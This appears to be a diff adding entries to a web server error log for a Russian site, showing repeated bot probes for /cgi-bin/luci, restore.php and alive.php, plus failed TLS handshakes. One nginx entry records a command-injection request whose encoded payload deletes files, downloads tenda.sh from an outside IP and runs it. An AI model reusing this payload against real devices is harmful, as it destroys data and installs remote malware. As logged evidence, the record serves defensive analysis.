+[Sun May 12 23:46:51.285549 2024] [cgi:error] [pid 2585076] [client 183.81.169.139:0] AH02811: script not found or unable to stat: /usr/lib/cgi-bin/luci
+[Sun May 12 23:53:46.455395 2024] [php:error] [pid 2585232] [client 103.14.26.206:0] script '/var/www/www-root/data/www/songbar.ru/restore.php' not found or unable to stat
+[Mon May 13 00:16:36.185045 2024] [cgi:error] [pid 2585997] [client 185.191.126.213:0] AH02811: script not found or unable to stat: /usr/lib/cgi-bin/luci
+[Mon May 13 00:27:24.446172 2024] [php:error] [pid 2586316] [client 170.64.233.121:0] script '/var/www/www-root/data/www/songbar.ru/alive.php' not found or unable to stat
+2024/05/13 00:27:33 [crit] 2447721#2447721: *3691 SSL_do_handshake() failed (SSL: error:141CF06C:SSL routines:tls_parse_ctos_key_share:bad key share) while SSL handshaking, client: 170.64.233.121, server: 5.35.87.162:443
+[Mon May 13 00:42:00.582127 2024] [cgi:error] [pid 2586883] [client 185.191.126.213:0] AH02811: script not found or unable to stat: /usr/lib/cgi-bin/luci
+[Mon May 13 01:50:42.833402 2024] [php:error] [pid 2588955] [client 103.14.26.206:0] script '/var/www/www-root/data/www/songbar.ru/restore.php' not found or unable to stat
+[Mon May 13 03:03:07.400880 2024] [cgi:error] [pid 2591672] [client 183.81.169.139:0] AH02811: script not found or unable to stat: /usr/lib/cgi-bin/luci
+[Mon May 13 04:16:41.315904 2024] [cgi:error] [pid 2594087] [client 183.81.169.139:0] AH02811: script not found or unable to stat: /usr/lib/cgi-bin/luci
+[Mon May 13 05:14:28.415794 2024] [cgi:error] [pid 2595828] [client 183.81.169.139:0] AH02811: script not found or unable to stat: /usr/lib/cgi-bin/luci
+2024/05/13 07:24:43 [crit] 2447721#2447721: *3886 SSL_do_handshake() failed (SSL: error:141CF06C:SSL routines:tls_parse_ctos_key_share:bad key share) while SSL handshaking, client: 65.49.1.38, server: 5.35.87.162:443
+[Mon May 13 09:19:20.293999 2024] [php:error] [pid 2604259] [client 103.14.26.206:0] script '/var/www/www-root/data/www/songbar.ru/restore.php' not found or unable to stat
+[Mon May 13 09:19:20.766510 2024] [php:error] [pid 2604260] [client 103.14.26.206:0] script '/var/www/www-root/data/www/songbar.ru/restore.php' not found or unable to stat
+[Mon May 13 09:48:12.241720 2024] [php:error] [pid 2605142] [client 103.14.26.206:0] script '/var/www/www-root/data/www/songbar.ru/restore.php' not found or unable to stat
+[Mon May 13 09:58:26.520834 2024] [cgi:error] [pid 2606232] [client 185.191.126.213:0] AH02811: script not found or unable to stat: /usr/lib/cgi-bin/luci
+2024/05/13 11:09:41 [crit] 2447721#2447721: *3976 SSL_do_handshake() failed (SSL: error:141CF06C:SSL routines:tls_parse_ctos_key_share:bad key share) while SSL handshaking, client: 44.220.188.91, server: 5.35.87.162:443
+[Mon May 13 11:14:07.366370 2024] [cgi:error] [pid 2608465] [client 31.220.1.83:0] AH02811: script not found or unable to stat: /usr/lib/cgi-bin/luci
+[Mon May 13 11:42:28.235154 2024] [cgi:error] [pid 2610210] [client 31.220.1.83:0] AH02811: script not found or unable to stat: /usr/lib/cgi-bin/luci
+[Mon May 13 11:42:43.593008 2024] [cgi:error] [pid 2610212] [client 80.94.92.60:0] AH02811: script not found or unable to stat: /usr/lib/cgi-bin/luci
+2024/05/13 11:42:43 [warn] 2447721#2447721: *4567 delaying request, excess: 0.800, by zone "songbar.ru", client: 80.94.92.60, server: songbar.ru, request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(rm%20-rf%20%2A%3B%20cd%20%2Ftmp%3B%20wget%20http%3A%2F%2F94.156.8.244%2Ftenda.sh%3B%20chmod%20777%20tenda.sh%3B%20.%2Ftenda.sh) HTTP/1.1", host: "5.35.87.162"
+[Mon May 13 11:42:43.628887 2024] [cgi:error] [pid 2610213] [client 80.94.92.60:0] AH02811: script not found or unable to stat: /usr/lib/cgi-bin/luci
+2024/05/13 11:55:43 [crit] 2447721#2447721: *4594 SSL_do_handshake() failed (SSL: error:141CF06C:SSL routines:tls_parse_ctos_key_share:bad key share) while SSL handshaking, client: 94.102.49.193, server: 5.35.87.162:443
+[Mon May 13 11:58:44.748727 2024] [cgi:error] [pid 2610615] [client 185.191.126.213:0] AH02811: script not found or unable to stat: /usr/lib/cgi-bin/luci
+[Mon May 13 12:16:09.746579 2024] [cgi:error] [pid 2611213] [client 183.81.169.139:0] AH02811: script not found or unable to stat: /usr/lib/cgi-bin/luci
+[Mon May 13 12:16:09.858783 2024] [cgi:error] [pid 2611214] [client 183.81.169.139:0] AH02811: script not found or unable to stat: /usr/lib/cgi-bin/luci
+[Mon May 13 12:23:04.975023 2024] [cgi:error] [pid 2611379] [client 185.191.126.213:0] AH02811: script not found or unable to stat: /usr/lib/cgi-bin/luci
+[Mon May 13 13:53:07.633407 2024] [cgi:error] [pid 2614196] [client 195.1.144.109:0] AH02811: script not found or unable to stat: /usr/lib/cgi-bin/luci
+[Mon May 13 14:07:08.760169 2024] [php:error] [pid 2615451] [client 103.14.26.206:0] script '/var/www/www-root/data/www/songbar.ru/restore.php' not found or unable to stat
+[Mon May 13 14:14:12.739306 2024] [cgi:error] [pid 2615727] [client 185.191.126.213:0] AH02811: script not found or unable to stat: /usr/lib/cgi-bin/luci
+[Mon May 13 14:35:53.733360 2024] [php:error] [pid 2616468] [client 103.14.26.206:0] script '/var/www/www-root/data/www/songbar.ru/restore.php' not found or unable to stat
+[Mon May 13 14:49:58.535898 2024] [cgi:error] [pid 2617024] [client 183.81.169.139:0] AH02811: script not found or unable to stat: /usr/lib/cgi-bin/luci
+[Mon May 13 14:49:58.894348 2024] [cgi:error] [pid 2617025] [client 183.81.169.139:0] AH02811: script not found or unable to stat: /usr/lib/cgi-bin/luci
+[Mon May 13 15:20:08.647382 2024] [cgi:error] [pid 2618243] [client 185.191.126.213:0] AH02811: script not found or unable to stat: /usr/lib/cgi-bin/luci
+[Mon May 13 16:26:45.504479 2024] [cgi:error] [pid 2620484] [client 31.220.1.83:0] AH02811: script not found or unable to stat: /usr/lib/cgi-bin/luci
+[Mon May 13 16:56:41.182989 2024] [cgi:error] [pid 2621698] [client 183.81.169.139:0] AH02811: script not found or unable to stat: /usr/lib/cgi-bin/luci
+[Mon May 13 16:56:41.296266 2024] [cgi:error] [pid 2621700] [client 183.81.169.139:0] AH02811: script not found or unable to stat: /usr/lib/cgi-bin/luci
+[Mon May 13 17:27:33.807806 2024] [cgi:error] [pid 2624123] [client 31.220.1.83:0] AH02811: script not found or unable to stat: /usr/lib/cgi-bin/luci
